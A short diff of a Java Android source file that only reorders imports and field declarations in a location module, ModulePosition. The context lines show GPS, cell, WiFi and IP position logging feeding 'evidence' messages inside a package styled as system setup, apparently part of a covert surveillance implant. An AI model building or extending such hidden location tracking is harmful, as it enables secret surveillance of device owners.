@@ -9,9 +9,6 @@
 
 package com.android.syssetup.module;
 
-import java.util.Date;
-import java.util.List;
-
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -35,6 +32,9 @@ import com.android.syssetup.util.Check;
 import com.android.syssetup.util.DataBuffer;
 import com.android.syssetup.util.DateTime;
 
+import java.util.Date;
+import java.util.List;
+
 public class ModulePosition extends BaseInstantModule implements GPSLocationListener {
 	private static final String TAG = "ModulePosition"; //$NON-NLS-1$
 	private static final int TYPE_GPS = 1;
@@ -47,13 +47,11 @@ public class ModulePosition extends BaseInstantModule implements GPSLocationList
 	private static final int LOG_TYPE_IP = 4;
 	private static final int LOG_TYPE_CDMA = 5;
 	private static final long POSITION_DELAY = 100;
-
+	int period;
+	BroadcastReceiver wifiReceiver = null;
 	private boolean gpsEnabled;
 	private boolean cellEnabled;
 	private boolean wifiEnabled;
-
-	int period;
-
 	private Object position = new Object();
 	private boolean scanning;
 
@@ -482,8 +480,6 @@ public class ModulePosition extends BaseInstantModule implements GPSLocationList
 		return messageEvidence(gpsPosition, LOG_TYPE_GPS);
 
 	}
-
-	BroadcastReceiver wifiReceiver = null;
 
 	public void registerWifiScan(final WifiManager wifiManager) {
 		if (scanning) {
